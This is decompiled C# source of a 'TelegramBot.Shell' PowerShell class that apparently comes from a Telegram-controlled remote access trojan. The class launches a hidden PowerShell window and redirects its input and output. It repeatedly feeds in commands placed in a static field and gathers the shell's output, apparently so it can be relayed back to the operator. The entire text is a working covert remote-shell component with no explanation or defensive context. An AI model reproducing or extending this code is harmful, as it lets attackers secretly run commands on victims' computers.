using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Text;
using System.Threading;

namespace TelegramBot.Shell
{
	// Token: 0x020000F8 RID: 248
	internal class PowerShell
	{
		// Token: 0x06000352 RID: 850 RVA: 0x00026844 File Offset: 0x00024A44
		public static void UseShell()
		{
			StringBuilder stringBuilder = new StringBuilder();
			Process process = new Process();
			process.StartInfo.FileName = "C:\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe";
			process.StartInfo.CreateNoWindow = true;
			process.StartInfo.UseShellExecute = false;
			process.StartInfo.RedirectStandardOutput = true;
			process.StartInfo.RedirectStandardInput = true;
			process.StartInfo.RedirectStandardError = true;
			process.OutputDataReceived += PowerShell.CmdOutputDataHandler;
			process.Start();
			process.BeginOutputReadLine();
			while (PowerShell.perm)
			{
				Thread.Sleep(PowerShell.timeout);
				if (!string.IsNullOrEmpty(PowerShell.cmd))
				{
					stringBuilder.Append(PowerShell.cmd);
					stringBuilder.Append("\n");
					process.StandardInput.WriteLine(stringBuilder);
					stringBuilder.Remove(0, stringBuilder.Length);
					PowerShell.cmd = "";
				}
			}
		}

		// Token: 0x06000353 RID: 851 RVA: 0x00026924 File Offset: 0x00024B24
		public static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
		{
			StringBuilder stringBuilder = new StringBuilder();
			if (!string.IsNullOrEmpty(outLine.Data))
			{
				stringBuilder.Append(outLine.Data);
				stringBuilder.Append("\n\n");
				byte[] bytes = Encoding.Default.GetBytes(stringBuilder.ToString());
				byte[] bytes2 = Encoding.Convert(Encoding.GetEncoding(866), Encoding.GetEncoding(866), bytes);
				string @string = Encoding.GetEncoding(866).GetString(bytes2);
				PowerShell.output.Add(@string);
			}
		}

		// Token: 0x04000574 RID: 1396
		public static bool perm;

		// Token: 0x04000575 RID: 1397
		public static string cmd;

		// Token: 0x04000576 RID: 1398
		public static int timeout = 7000;

		// Token: 0x04000577 RID: 1399
		public static List<string> output = new List<string>();
	}
}
